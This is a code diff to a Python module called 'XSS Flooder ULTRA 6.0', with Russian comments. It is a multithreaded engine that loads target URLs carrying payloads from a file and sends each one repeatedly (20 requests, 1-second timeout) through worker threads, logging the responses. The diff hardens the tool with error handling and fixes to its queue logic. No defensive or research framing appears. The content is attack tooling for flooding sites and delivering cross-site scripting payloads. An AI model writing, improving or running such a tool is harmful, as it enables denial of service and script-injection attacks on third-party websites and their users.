@@ -2,7 +2,6 @@
 """
 XSS Flooder ULTRA 6.0 — многопоточный движок
 --------------------------------------------
-
 Особенности:
 - Worker-потоки (постоянные)
 - Очередь задач (Queue)
@@ -11,8 +10,6 @@ XSS Flooder ULTRA 6.0 — многопоточный движок
 - Логи в logs/xss_flood_log.txt
 - Интеграция с settings.py и ThreatConnector
 """
-
-from __future__ import annotations
 
 import time
 import queue
@@ -42,8 +39,11 @@ payload_urls: list[str] = []
 # 📝 Логирование ответа (локальный файл)
 def log_response(url: str, status: int | str, content: str) -> None:
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with open(LOG_PATH, "a", encoding="utf-8") as f:
-        f.write(f"[{timestamp}] [{status}] {url}\n")
+    try:
+        with LOG_PATH.open("a", encoding="utf-8") as f:
+            f.write(f"[{timestamp}] [{status}] {url}\n")
+    except Exception as e:
+        print(f"[XSSFlooder] Ошибка записи лога: {e}")
 
 
 # 📂 Загрузка целей из файла
@@ -52,12 +52,16 @@ def load_targets_from_file(path: Path) -> list[str]:
     if not path.exists():
         print(f"[XSSFlooder] Файл {path} не найден.")
         return []
-    with open(path, encoding="utf-8") as f:
-        return [
-            line.strip()
-            for line in f
-            if line.strip() and not line.strip().startswith("#")
-        ]
+    try:
+        with path.open(encoding="utf-8") as f:
+            return [
+                line.strip()
+                for line in f
+                if line.strip() and not line.strip().startswith("#")
+            ]
+    except Exception as e:
+        print(f"[XSSFlooder] Ошибка чтения файла {path}: {e}")
+        return []
 
 
 # Инициализация списка целей
@@ -68,8 +72,8 @@ payload_urls = load_targets_from_file(TARGETS_FILE)
 def send_payload(
     url: str,
     callback: Optional[FloodCallback],
-    timeout: int = 1,        # ⏱ таймаут 1 сек
-    repeat: int = 20,        # 🔁 20 запросов подряд
+    timeout: int = 1,
+    repeat: int = 20,
     delay: float = 0.0,
 ) -> None:
     """Отправляет несколько запросов подряд на один URL."""
@@ -90,7 +94,7 @@ def send_payload(
                 "status": status,
                 "snippet": snippet,
                 "error": snippet if status == "ERROR" else None,
-            }
+            },
         )
 
         # Callback для GUI
@@ -110,12 +114,14 @@ def worker_thread(task_queue: queue.Queue[tuple[str, int, float]], callback: Opt
         try:
             url, repeat, delay = task_queue.get(timeout=1)
             if url is None:
+                task_queue.task_done()
                 break  # сигнал завершения
             send_payload(url, callback, timeout, repeat=repeat, delay=delay)
+            task_queue.task_done()
         except queue.Empty:
             continue
-        finally:
-            task_queue.task_done()
+        except Exception as e:
+            print(f"[XSSFlooder] Ошибка в worker: {e}")
 
 
 # 🚀 Запуск многопоточного флудера
@@ -125,8 +131,8 @@ def start_flood(
     flood_count: int = 1,
     max_workers: Optional[int] = None,
     callback: Optional[FloodCallback] = None,
-    timeout: int = 1,             # ⏱ таймаут 1 сек
-    repeat_each: int = 20,        # 🔁 20 запросов на каждый URL
+    timeout: int = 1,
+    repeat_each: int = 20,
     delay_each: float = 0.0,
 ) -> None:
     urls = list(target_urls or payload_urls)
